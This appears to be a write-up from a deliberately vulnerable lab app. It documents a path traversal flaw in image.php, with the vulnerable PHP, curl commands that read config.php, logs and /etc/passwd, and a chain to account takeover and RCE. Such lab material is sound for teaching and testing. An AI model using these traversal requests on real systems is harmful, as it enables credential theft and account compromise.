# 10 — Path traversal in the image handler (arbitrary file read)

- **OWASP Top 10 (2021):** A01:2021 – Broken Access Control
- **Severity:** High
- **Difficulty:** Easy

## Where

`web/image.php:2,6` — `GET /image.php?file=<path>` (unauthenticated):

```php
$f = isset($_GET['file']) ? $_GET['file'] : '';
...
readfile($f);
```

## How it works (root cause)

The `file` parameter is passed straight to `readfile()` with **no
validation** — no whitelist of allowed files, no check that the path stays
inside the web root, and no rejection of `..`. The only "logic" is a
Content-Type guess from the extension. `readfile()` happily resolves
relative paths against the script's directory (`web/`) and walks up with
`../`.

## Exploitation steps

1. Read a file inside the web root (relative to `web/`):

   ```bash
   curl -s 'http://localhost:8080/image.php?file=includes/config.php'
   ```

2. Walk out of the web root to read app data / logs:

   ```bash
   curl -s 'http://localhost:8080/image.php?file=../data/logs/app.log'
   ```

3. Escape entirely to the filesystem:

   ```bash
   curl -s 'http://localhost:8080/image.php?file=../../../../../../etc/passwd'
   ```

## Working PoC (verified)

```
GET /image.php?file=../data/logs/app.log
```

returns the application log, including **cleartext password-reset codes**:

```
... reset code for ulla: 48392 ...
```

```
GET /image.php?file=../../../../../../etc/passwd
```

returns the system `/etc/passwd`.

```
GET /image.php?file=includes/config.php
```

returns the PHP source of `config.php` — full DB credentials and the API
token key.

## Expected result / verification

- Arbitrary files readable as the PHP-FPM user (uid 1000), including:
  - `web/includes/config.php` (DB creds, `API_TOKEN_KEY`)
  - `data/logs/app.log` (cleartext reset codes → account takeover via reset)
  - `conf/php.ini`, `../conf/nginx.conf`
  - anything else the fpm user can read (`/etc/passwd`, …)

## Attack chain

```
path traversal
  → data/logs/app.log → current reset code for any user
      → /reset.php step 2+3 → set a new password → take over the account
  → includes/config.php → API_TOKEN_KEY
      → forge an admin API token (18) → /api/v1/uplist (17) → RCE
```

## Notes

- The `Content-Type` switch is cosmetic; the file bytes are returned
  regardless of extension, so there is no real "image only" restriction.
- This is the intended low-difficulty entry point to the reset-code and
  API-token chains.
